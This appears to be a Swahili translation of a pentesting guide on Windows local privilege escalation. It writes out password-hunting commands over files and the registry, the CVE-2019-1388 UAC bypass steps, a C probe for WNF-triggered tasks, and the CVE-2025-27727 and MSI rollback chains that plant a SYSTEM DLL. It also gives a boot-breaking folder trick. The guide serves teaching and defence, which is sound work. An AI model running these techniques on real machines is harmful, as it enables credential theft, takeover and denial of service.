Class na interfaces za COM hufafanuliwa kwenye registry chini ya **HKEY\CLASSES\ROOT\CLSID** na **HKEY\CLASSES\ROOT\Interface** mtawalia. Registry hii huundwa kwa kuunganisha **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Ndani ya CLSIDs za registry hii unaweza kupata registry child **InProcServer32**, ambayo ina **default value** inayoelekeza kwenye **DLL** na value inayoitwa **ThreadingModel**, ambayo inaweza kuwa **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single au Multi) au **Neutral** (Thread Neutral).

![Historia ya Vivinjari - COM DLL Overwriting: Ndani ya CLSIDs za registry hii unaweza kupata registry child InProcServer32, ambayo ina default value inayoelekeza kwenye DLL na value...](<../../images/image (729).png>)

Kimsingi, ikiwa unaweza **kubadilisha DLL yoyote** itakayotekelezwa, unaweza **kuongeza mamlaka** ikiwa DLL hiyo itatekelezwa na mtumiaji mwingine.

Ili kujifunza jinsi washambuliaji wanavyotumia COM Hijacking kama mbinu ya persistence, angalia:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Utafutaji wa jumla wa Nywila kwenye faili na registry**

**Tafuta yaliyomo kwenye faili**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Tafuta faili kwa jina fulani**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Tafuta majina ya funguo na nywila kwenye registry**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Zana zinazotafuta nywila

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ni plugin ya msf** niliyoitengeneza ili **kutekeleza kiotomatiki kila POST module ya metasploit inayotafuta credentials** ndani ya mwathiriwa.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) hutafuta kiotomatiki faili zote zenye nywila zilizotajwa kwenye ukurasa huu.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ni zana nyingine nzuri ya kutoa nywila kutoka kwenye mfumo.

Zana ya [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) hutafuta **sessions**, **usernames** na **nywila** za zana mbalimbali zinazohifadhi data hii katika maandishi wazi (PuTTY, WinSCP, FileZilla, SuperPuTTY, na RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Fikiria kwamba **process inayotumia SYSTEM inafungua process mpya** (`OpenProcess()`) yenye **ufikiaji kamili**. Process hiyo hiyo **pia inaunda process mpya** (`CreateProcess()`) **yenye privileges za chini lakini inayorithi handles zote zilizo wazi za process kuu**.\
Kisha, ikiwa una **ufikiaji kamili wa process yenye privileges za chini**, unaweza kupata **handle iliyo wazi ya process yenye privileges za juu iliyoundwa** kwa kutumia `OpenProcess()` na **kuingiza shellcode**.\
[Soma mfano huu ili kupata maelezo zaidi kuhusu **jinsi ya kugundua na kutumia vulnerability hii**.](leaked-handle-exploitation.md)\
[Soma **chapisho hili jingine kwa maelezo kamili zaidi kuhusu jinsi ya kupima na kutumia vibaya handles nyingine zilizo wazi za processes na threads zilizorithiwa zikiwa na viwango tofauti vya permissions (si ufikiaji kamili pekee)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Sehemu za kumbukumbu zinazoshirikiwa, zinazoitwa **pipes**, huwezesha mawasiliano na uhamishaji wa data kati ya processes.

Windows hutoa kipengele kinachoitwa **Named Pipes**, kinachoruhusu processes zisizohusiana kushiriki data, hata kupitia mitandao tofauti. Hii inafanana na usanifu wa client/server, ambapo roles hufafanuliwa kama **named pipe server** na **named pipe client**.

Data inapotumwa kupitia pipe na **client**, **server** iliyoweka pipe hiyo inaweza **kujifanya kuwa** **client**, iwapo ina haki zinazohitajika za **SeImpersonate**. Kutambua **process yenye privileges za juu** inayowasiliana kupitia pipe unayoweza kuiga kunatoa fursa ya **kupata privileges za juu zaidi** kwa kutumia utambulisho wa process hiyo mara tu inapowasiliana na pipe uliyoanzisha. Kwa maelekezo ya kutekeleza shambulio kama hilo, miongozo hii inaweza kusaidia [**hapa**](named-pipe-client-impersonation.md) na [**hapa**](#from-high-integrity-to-system).

Pia, tool ifuatayo hukuruhusu **kukatiza mawasiliano ya named pipe kwa kutumia tool kama burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **na tool hii hukuruhusu kuorodhesha na kuona pipes zote ili kupata privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Huduma ya Telephony (TapiSrv) katika hali ya server hufichua `\\pipe\\tapsrv` (MS-TRP). Client ya mbali iliyothibitishwa inaweza kutumia vibaya njia ya matukio ya async inayotumia mailslot ili kubadilisha `ClientAttach` kuwa **uandikaji wa baiti 4** katika faili yoyote iliyopo ambayo `NETWORK SERVICE` inaweza kuiandikia, kisha kupata haki za msimamizi wa Telephony na kupakia DLL yoyote kama huduma. Mchakato kamili:

- `ClientAttach` huku `pszDomainUser` ikiwa imewekwa kwenye path iliyopo inayoweza kuandikwa → huduma huifungua kupitia `CreateFileW(..., OPEN_EXISTING)` na kuitumia kuandika matukio ya async.
- Kila tukio huandika `InitContext` inayodhibitiwa na mshambuliaji kutoka `Initialize` kwenye handle hiyo. Sajili line app kwa `LRegisterRequestRecipient` (`Req_Func 61`), anzisha `TRequestMakeCall` (`Req_Func 121`), pata data kupitia `GetAsyncEvents` (`Req_Func 0`), kisha futa usajili/zima huduma ili kurudia uandikaji kwa njia thabiti.
- Jiongeze kwenye `[TapiAdministrators]` katika `C:\Windows\TAPI\tsec.ini`, unganisha tena, kisha uite `GetUIDllName` ukiwa na path ya DLL yoyote ili kutekeleza `TSPI_providerUIIdentify` kama `NETWORK SERVICE`.

Maelezo zaidi:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Mengineyo

### Viendelezi vya Faili Vinavyoweza Kuendesha Vitu katika Windows

Angalia ukurasa **[https://filesec.io/](https://filesec.io/)**

### Matumizi mabaya ya Protocol handler / ShellExecute kupitia vionyeshi vya Markdown

Viungo vya Markdown vinavyoweza kubofya na kutumwa kwa `ShellExecuteExW` vinaweza kuwasha URI handlers hatari (`file:`, `ms-appinstaller:` au scheme yoyote iliyosajiliwa) na kutekeleza faili zinazodhibitiwa na mshambuliaji kama mtumiaji wa sasa. Tazama:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Kufuatilia Command Lines kwa ajili ya nywila**

Unapopata shell kama mtumiaji, huenda kukawa na scheduled tasks au processes nyingine zinazotekelezwa ambazo **hupitisha credentials kwenye command line**. Script iliyo hapa chini hunasa command lines za processes kila baada ya sekunde mbili na kulinganisha hali ya sasa na ile ya awali, kisha kutoa tofauti zozote.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Kuiba nywila kutoka kwa michakato

## Kutoka kwa mtumiaji asiye na mapendeleo hadi NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ikiwa unaweza kufikia kiolesura cha picha (kupitia console au RDP) na UAC imewezeshwa, katika baadhi ya matoleo ya Microsoft Windows inawezekana kuendesha terminal au mchakato mwingine wowote kama "NT\AUTHORITY SYSTEM" kutoka kwa mtumiaji asiye na mapendeleo.

Hii huwezesha kupandisha mapendeleo na kukwepa UAC kwa wakati mmoja kwa kutumia udhaifu huohuo. Zaidi ya hayo, hakuna haja ya kusakinisha chochote, na binary inayotumika wakati wa mchakato huo imetiwa sahihi na kutolewa na Microsoft.

Baadhi ya mifumo iliyoathiriwa ni hii:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Ili ku-exploit udhaifu huu, ni muhimu kutekeleza hatua zifuatazo:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Una faili na taarifa zote zinazohitajika katika repository hii ya GitHub:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Kutoka Administrator Medium hadi High Integrity Level / UAC Bypass

Soma haya ili **ujifunze kuhusu Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Kisha **soma haya ili ujifunze kuhusu UAC na UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Kupakia Directory Junctions kwenye Served Root

Programu inaweza kuunda upload subdirectory inayotabirika, kuandika jina la faili lililotolewa na mtumiaji ndani yake, kisha kuchakata faili hilo. Ikiwa mtumiaji mwenye ruhusa ndogo anaweza kuondoa na kubadilisha subdirectory hiyo na NTFS junction kabla ya uandishi wa upande wa server, uandishi unaweza kufuata junction hadi directory inayotolewa na web server. Script iliyowekwa hapo inaweza kuendeshwa kama utambulisho wa web-service ikiwa server inaendesha aina hiyo ya faili. Hili ni eneo la arbitrary-write linalotegemea programu husika; kuwa na upload directory inayoweza kuandikiwa au junction iliyopo pekee hakuthibitishi uwezekano huo.

Kagua jinsi path inavyoundwa na muda wa uundaji huo katika upload handler, ruhusa halisi za mtumiaji za kufuta/kuunda subdirectory, ACLs halisi za destination, iwapo writer hufuata reparse points, na iwapo web server huendesha faili katika destination hiyo. Thibitisha utambulisho wa process wa writer na web server kando. Passive inventory inaweza kuonyesha directory ACLs na reparse metadata, lakini haiwezi kuthibitisha tabia ya handler au ubadilishaji wa junction utakaofanyika baadaye. Ikiwa execution inafanyika chini ya service account, kagua **token halisi ya process** kabla ya kuzingatia njia tofauti inayotumia token-privilege.

## Usafishaji wa scheduled-task wenye ruhusa za juu unaochochewa na WNF

Scheduled task inayokataa kuendeshwa kwa mkono bado inaweza kuwa na kichocheo kinachopatikana kwa mtumiaji asiye na ruhusa za juu. Unakagua task yenye ruhusa za juu, export XML yake na uchunguze **triggers zote** pamoja na task DACL, principal na action. Hasa, `WnfStateChangeTrigger` hutaja state ya Windows Notification Facility (WNF); ikiwa hali hiyo inayoweza kulindwa inaruhusu mtumiaji wa sasa kuchapisha sasisho, mtumiaji anaweza kuanzisha task kwa njia isiyo ya moja kwa moja chini ya utambulisho uliosanidiwa, licha ya `<AllowStartOnDemand>false</AllowStartOnDemand>`.<sup>[[43]](#references)</sup>

Kwa mfano, task ya Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` iliendeshwa kama SYSTEM, ikakubali sasisho za WNF state `7508BCA32C079E41` kutoka kwa mtumiaji wa kawaida, kisha ikakagua `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` hata wakati Recall ilikuwa imezimwa.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Ili kupima ufikikaji, tafuta `ZwUpdateWnfStateData` katika `ntdll.dll`, tuma sasisho tupu kwa jina la hali lenye byte nane, kisha linganisha hali ya urejeshaji na data ya mara ya mwisho kazi ilipoendeshwa au shughuli za Procmon. Probe ifuatayo iliyofupishwa hutumia mfuatano wa byte kutoka kwenye mfano wa kazi ya Recall; badilisha byte hizo kwa zile zilizotolewa kwa kazi inayojaribiwa.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Kubadilisha usafishaji wa kujirudia kuwa ufutaji wenye ruhusa za juu

Primitive muhimu si trigger pekee, bali ni routine ya usafishaji yenye ruhusa za juu inayopokea directory inayodhibitiwa na mshambuliaji. Fuatilia operesheni kuanzia enumeration hadi mutation ya mwisho: ugunduzi wa profile/session, watoto waliochaguliwa kwa wildcard, `SHCreateItemFromParsingName`, na `IFileOperation::DeleteItem` ni viashiria thabiti kwamba pathname iliyokaguliwa awali itafuatwa baadaye kwa kujirudia. Ikiwa descendants hazifunguliwi kuhusiana na directory handles zinazoaminika na kuthibitishwa kabla ya kufutwa, mshambuliaji anaweza kubadilisha resolution kati ya enumeration na matumizi.<sup>[[43]](#references)</sup>

Oanisha WNF trigger na [oplock, junction na Object Manager symlink substitution](#from-folder-contents-delete-to-system-eop) iliyoelezwa hapa chini: oplock husitisha cleaner baada ya kuchagua child halali, huku ancestor inayoweza kuandikwa ikibadilishwa ili ufutaji wenye ruhusa za juu unapoendelea, utatue kupitia `\RPC Control` hadi kwenye target iliyolindwa. Katika mnyororo wa Recall, hii ilisababisha ufutaji wa `C:\Config.Msi` na SYSTEM, ambao ulihitajika kwa mbinu ya MSI rollback iliyoandikwa.<sup>[[31]](#references)[[43]](#references)</sup>

### Descendants zilizojipachika hupita marekebisho ya shallow reparse-point

Kuthibitisha tu root inayodhibitiwa na mshambuliaji na child wake wa moja kwa moja hakulindi ufutaji wa kujirudia unaotegemea pathname. Acha objects hizo zilizokaguliwa ziwe halali, kisha hamishia junction/oplock substitution ndani ya child nyingine iliyo chini yake; `IFileOperation::DeleteItem` hatimaye hufikia descendant ambayo haikuthibitishwa na kufuata target yake mpya. CVE-2026-20941 ilisababishwa hasa na aina hii ya marekebisho yasiyokamilika baada ya patch ya kwanza ya Recall kuthibitisha `UKP` na directory yenye umbo la GUID, lakini ikaacha operesheni ya zamani ya ufutaji wa kujirudia.<sup>[[43]](#references)</sup>

Muundo salama ni kufungua **kila descendant** kuhusiana na directory handle ambayo tayari inaaminika, kupata na kuthibitisha path/object ya mwisho iliyotatuliwa, kisha kutumia deletion disposition kwenye handle hiyo iliyothibitishwa. Usithibitishe prefix kisha urudi kwenye ufutaji wa kujirudia unaotegemea path. Wakati wa kukagua patch, pia kagua structures kwenye call site halisi: katika kesi hii, uchunguzi wa runtime wa `OBJECT_ATTRIBUTES` kwenye `NtCreateFile` ulionyesha `RootDirectory` isiyo-null na jina la relative `{GUID}\\secure_file.lock`, hivyo kukanusha matokeo ya decompiler yaliyopotosha yaliyodokeza primitive ya pili ya `FILE_DELETE_ON_CLOSE`.<sup>[[43]](#references)</sup>

## Kutoka Kufuta/Kuhamisha/Kubadili Jina Folder Yoyote hadi SYSTEM EoP

Mbinu iliyoelezwa [**kwenye chapisho hili la blogu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) yenye exploit code [**inayopatikana hapa**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Kimsingi, shambulio hili linatumia vibaya kipengele cha rollback cha Windows Installer ili kubadilisha faili halali na hasidi wakati wa mchakato wa kuondoa programu. Kwa hili, mshambuliaji anahitaji kuunda **MSI installer hasidi** itakayotumika kuteka nyara folder ya `C:\Config.Msi`, ambayo baadaye itatumiwa na Windows Installer kuhifadhi rollback files wakati wa kuondoa vifurushi vingine vya MSI; rollback files hizo zitakuwa zimebadilishwa ili ziwe na malicious payload.

### Windows Installer COM cleanup-path injection (CVE-2025-27727)

Mteja mwenye ruhusa za chini anaweza kufikia huduma ya SYSTEM `msiexec.exe` kupitia COM object ya `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Reverse engineering ilibaini kwamba miito husika ya `IMsiServer` ni `MsiBeginTransactionW` kwenye vtable offset `0xA0`, `SetEEUIDirectoryAndFilter` kwenye `0xC8`, na `CleanupTempPackages` kwenye `0x50`. Majina na offsets hizi zimepatikana kwa reverse engineering na zinaweza kutofautiana kati ya builds.<sup>[[41]](#references)</sup>

Kwa mtumiaji asiye administrator, `SetEEUIDirectoryAndFilter` huiga utambulisho wa caller kwa muda mfupi tu inapofungua path iliyotolewa kwa `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS`, na `FILE_FLAG_OPEN_REPARSE_POINT`. Hii inathibitisha kwamba caller anaweza kufuta directory na huepusha kufuata reparse point, lakini **haihusishi** file object iliyokaguliwa na usafishaji unaofuata wala kuthibitisha kwamba Windows Installer ndiyo iliyoiunda.<sup>[[41]](#references)</sup>

Baada ya `MsiBeginTransactionW`, `SetEEUIDirectoryAndFilter` hupanga path kama folder bila kujali hoja ya filter ya caller. Huduma huandika thamani ya `REG_DWORD` yenye jina maalum chini ya `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: jina la thamani ni path inayodhibitiwa na caller, na data `0x00000002` ni flag ya folder. Kisha `CleanupTempPackages(NULL, FALSE)` huingia moja kwa moja kwenye usafishaji. Worker wake mwenye ruhusa za juu huenumerate thamani za registry na kupitisha entries za folder kwa `FDeleteFolder` ya kujirudia bila kukagua asili ya path. Ikiwa uondoaji wa kawaida hautafaulu, code pia huita `LockdownPath`, huondoa file attributes, kisha hujaribu tena.<sup>[[41]](#references)</sup>

Mfuatano mdogo wa miito uliopatikana kutoka `msi.dll` ni:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Primitive muhimu ni kutumia tena path badala ya kuelekeza kupitia junction. Sajili `C:\Config.Msi` iliyoundwa na mshambuliaji, ifute, kisha Windows Installer iunde tena pathname hiyo hiyo ikiwa na rollback data iliyolindwa. Cleanup huamini jina la zamani la `TempPackages` na kufuta directory mpya kama SYSTEM. Hii hupita ulinzi uliokusudiwa wa `FILE_FLAG_OPEN_REPARSE_POINT` na mitigation ya redirection-trust kwa sababu reparse point haihitajiki.<sup>[[41]](#references)</sup>

Primitive hii ya kufuta inafaa katika rollback chain iliyo hapa chini: hifadhi rekodi tofauti ya `Installer\Folders`, futa `C:\Config.Msi` iliyolindwa, iunde tena ikiwa na NULL DACL, na uhifadhi handle yenye ruhusa ya `WRITE_DAC` kabla installer haijaimarisha DACL. Handle iliyofunguliwa awali inaweza kurejesha DACL iliyoruhusu ufikiaji kwa kutumia `NtSetSecurityObject`, kisha `.rbs` iliyozalishwa inaweza kubadilishwa kabla rollback haijaendelea.<sup>[[41]](#references)</sup>

Microsoft ilirekebisha path hiyo kwa kuzuia `CMsiTransaction::SetEEUIDirectoryAndFilter` kuita `ScheduleFileOrFolderDelete` feature gate mpya inapowezeshwa. COM call bado inaweza kurejesha success, lakini haiweki tena path inayodhibitiwa na mshambuliaji katika `TempPackages`. Sakinisha Windows security updates za Aprili 2025 badala ya kutumia kurejea kwa mafanikio kwa method kama jaribio la kuthibitisha patch.<sup>[[41]](#references)[[42]](#references)</sup>

Mbinu iliyofupishwa ni hii:

1. **Hatua ya 1 – Kujiandaa kwa Hijack (acha `C:\Config.Msi` ikiwa tupu)**

- Hatua ya 1: Sakinisha MSI
    - Unda `.msi` inayosakinisha faili isiyo na madhara (kwa mfano, `dummy.txt`) katika folder inayoweza kuandikika (`TARGETDIR`).
    - Weka installer iwe **"UAC Compliant"**, ili **mtumiaji asiye admin** aweze kuiendesha.
    - Acha **handle** ikiwa wazi kwa faili baada ya usakinishaji.

- Hatua ya 2: Anza Uninstall
    - Ondoa `.msi` hiyo hiyo.
    - Mchakato wa uninstall huanza kuhamisha faili hadi `C:\Config.Msi` na kuzibadilisha majina kuwa faili za `.rbf` (rollback backups).
    - **Fuatilia handle ya faili iliyo wazi** kwa kutumia `GetFinalPathNameByHandle` ili kugundua faili inapokuwa `C:\Config.Msi\<random>.rbf`.

- Hatua ya 3: Custom Syncing
    - `.msi` ina **custom uninstall action (`SyncOnRbfWritten`)** ambayo:
        - Hutoa ishara baada ya `.rbf` kuandikwa.
        - Kisha **husubiri** event nyingine kabla ya kuendelea na uninstall.

- Hatua ya 4: Zuia Kufutwa kwa `.rbf`
    - Ishara ikitolewa, **fungua faili ya `.rbf`** bila `FILE_SHARE_DELETE` — hii **huizuia kufutwa**.
    - Kisha **tuma ishara ya majibu** ili uninstall ikamilike.
    - Windows Installer inashindwa kufuta `.rbf`, na kwa kuwa haiwezi kufuta yaliyomo yote, **`C:\Config.Msi` haiondolewi**.

- Hatua ya 5: Futa `.rbf` Mwenyewe
    - Wewe (mshambuliaji) futa faili ya `.rbf` mwenyewe.
    - Sasa **`C:\Config.Msi` ni tupu**, tayari kwa hijack.

> Katika hatua hii, **anzisha udhaifu wa kufuta folder kiholela katika kiwango cha SYSTEM** ili kufuta `C:\Config.Msi`.

2. **Hatua ya 2 – Kubadilisha Rollback Scripts kwa Zilizo Hasidi**

- Hatua ya 6: Unda Tena `C:\Config.Msi` ikiwa na ACL Dhaifu
    - Unda tena folder ya `C:\Config.Msi` mwenyewe.
    - Weka **DACL dhaifu** (kwa mfano, Everyone:F), na **acha handle ikiwa wazi** yenye `WRITE_DAC`.

- Hatua ya 7: Endesha Usakinishaji Mwingine
    - Sakinisha `.msi` tena, ukiweka:
        - `TARGETDIR`: Mahali panapoweza kuandikika.
        - `ERROROUT`: Variable inayosababisha hitilafu ya lazima.
    - Usakinishaji huu utatumika kuanzisha **rollback** tena, ambayo husoma `.rbs` na `.rbf`.

- Hatua ya 8: Fuatilia `.rbs`
    - Tumia `ReadDirectoryChangesW` kufuatilia `C:\Config.Msi` hadi `.rbs` mpya itakapotokea.
    - Rekodi jina lake la faili.

- Hatua ya 9: Sawazisha Kabla ya Rollback
    - `.msi` ina **custom install action (`SyncBeforeRollback`)** ambayo:
        - Hutoa event baada ya `.rbs` kuundwa.
        - Kisha **husubiri** kabla ya kuendelea.

- Hatua ya 10: Weka Tena ACL Dhaifu
    - Baada ya kupokea event ya `.rbs created`:
        - Windows Installer **huweka tena ACL zenye ulinzi mkali** kwenye `C:\Config.Msi`.
        - Lakini kwa kuwa bado una handle yenye `WRITE_DAC`, unaweza **kuweka tena ACL dhaifu**.

> ACL **hutekelezwa tu wakati handle inafunguliwa**, kwa hiyo bado unaweza kuandika kwenye folder.

- Hatua ya 11: Weka `.rbs` na `.rbf` Bandia
    - Andika juu ya faili ya `.rbs` na **rollback script bandia** inayoelekeza Windows:
        - Kurejesha faili yako ya `.rbf` (malicious DLL) kwenye **mahali penye upendeleo wa juu** (kwa mfano, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Weka `.rbf` bandia iliyo na **payload DLL hasidi ya kiwango cha SYSTEM**.

- Hatua ya 12: Anzisha Rollback
    - Tuma ishara ya sync ili installer iendelee.
    - **Custom action ya aina ya 19 (`ErrorOut`)** imewekwa ili **kusababisha usakinishaji ushindwe kimakusudi** katika hatua inayojulikana.
    - Hii husababisha **rollback kuanza**.

- Hatua ya 13: SYSTEM Husakinisha DLL Yako
    - Windows Installer:
        - Husoma `.rbs` yako hasidi.
        - Hunakili DLL yako ya `.rbf` hadi mahali lengwa.
    - Sasa una **DLL yako hasidi katika path inayopakiwa na SYSTEM**.

- Hatua ya Mwisho: Tekeleza Code ya SYSTEM
    - Endesha **binary inayoaminika inayopandisha ruhusa kiotomatiki** (kwa mfano, `osk.exe`) inayopakia DLL uliyo-hijack.
    - **Bam**: Code yako hutekelezwa **kama SYSTEM**.


### Kutoka kwa Arbitrary File Delete/Move/Rename hadi SYSTEM EoP

Mbinu kuu ya MSI rollback (iliyotangulia) hudhani unaweza kufuta **folder nzima** (kwa mfano, `C:\Config.Msi`). Lakini je, ikiwa udhaifu wako unaruhusu tu **kufuta faili kiholela**?

Unaweza kutumia **undani wa NTFS**: kila folder ina alternate data stream iliyofichwa inayoitwa:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Stream hii huhifadhi **metadata ya index** ya folda.

Kwa hiyo, ukifuta stream ya `::$INDEX_ALLOCATION` ya folda, NTFS **huondoa folda nzima** kwenye mfumo wa faili.

Unaweza kufanya hivi kwa kutumia API za kawaida za kufuta faili kama:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Ingawa unaita API ya kufuta *file*, **inafuta folder yenyewe**.

### Kutoka Kufuta Yaliyomo kwenye Folder hadi SYSTEM EoP
Vipi ikiwa primitive yako hairuhusu kufuta file/folder yoyote unayotaka, lakini **inaruhusu kufuta *yaliyomo* kwenye folder inayodhibitiwa na mshambuliaji**?

1. Hatua ya 1: Sanidi folder na file ya chambo
- Unda: `C:\temp\folder1`
- Ndani yake: `C:\temp\folder1\file1.txt`

2. Hatua ya 2: Weka **oplock** kwenye `file1.txt`
- Oplock **husitisha utekelezaji** wakati mchakato wenye haki za juu unapojaribu kufuta `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Hatua ya 3: Anzisha mchakato wa SYSTEM (kwa mfano, `SilentCleanup`)
- Mchakato huu huchanganua folda (kwa mfano, `%TEMP%`) na kujaribu kufuta yaliyomo.
- Unapofikia `file1.txt`, **oplock inawashwa** na kukabidhi udhibiti kwa callback yako.

4. Hatua ya 4: Ndani ya callback ya oplock – elekeza upya ufutaji

- Chaguo A: Hamisha `file1.txt` mahali pengine
    - Hii huondoa yaliyomo kwenye `folder1` bila kuvunja oplock.
    - Usifute `file1.txt` moja kwa moja — hilo litaachilia oplock kabla ya wakati.

- Chaguo B: Badilisha `folder1` kuwa **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Chaguo C: Unda **symlink** katika `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Hii inalenga mkondo wa ndani wa NTFS unaohifadhi metadata ya folda — kuufuta kunafuta folda.

5. Hatua ya 5: Achilia oplock
- Mchakato wa SYSTEM unaendelea na kujaribu kufuta `file1.txt`.
- Lakini sasa, kwa sababu ya junction + symlink, kwa kweli unafuta:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Matokeo**: `C:\Config.Msi` imefutwa na SYSTEM.

### Kutoka Kuunda Folda Yoyote Hadi DoS ya Kudumu

Tumia primitive inayokuwezesha **kuunda folda yoyote kama SYSTEM/admin** — hata kama **huwezi kuandika faili** au **kuweka ruhusa dhaifu**.

Unda **folda** (si faili) yenye jina la **driver muhimu ya Windows**, kwa mfano:
```
C:\Windows\System32\cng.sys
```

- Njia hii kwa kawaida inalingana na driver ya kernel-mode `cng.sys`.
- Ukiitengeneza mapema kama folda, Windows hushindwa kupakia driver halisi wakati wa kuwasha.
- Kisha, Windows hujaribu kupakia `cng.sys` wakati wa kuwasha.
- Huona folda, hushindwa kupata driver halisi, na mfumo huanguka au kuwasha hukwama.
- Hakuna njia mbadala wala urejeshaji bila kuingilia kati kutoka nje (kwa mfano, boot repair au ufikiaji wa diski).

### Kutoka kwa njia za log/backup zenye haki za juu + OM symlinks hadi arbitrary file overwrite / boot DoS

Wakati huduma yenye haki za juu huandika logs/exports kwenye njia iliyosomwa kutoka kwenye config inayoweza kuandikwa, elekeza njia hiyo kwa kutumia Object Manager symlinks + NTFS mount points ili kubadilisha uandishi huo wenye haki za juu kuwa arbitrary overwrite (hata bila SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Mahitaji**
- Config inayohifadhi njia lengwa inaweza kuandikwa na mshambuliaji (kwa mfano, `%ProgramData%\...\.ini`).
- Uwezo wa kuunda mount point inayoelekeza `\RPC Control` na OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
